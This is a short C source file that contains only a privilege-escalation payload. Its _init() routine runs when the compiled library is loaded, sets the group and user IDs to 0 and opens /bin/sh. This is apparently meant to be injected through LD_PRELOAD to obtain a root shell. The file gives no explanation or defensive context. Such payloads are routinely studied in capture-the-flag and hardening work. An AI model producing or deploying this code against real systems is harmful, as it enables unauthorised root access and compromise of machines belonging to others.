#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
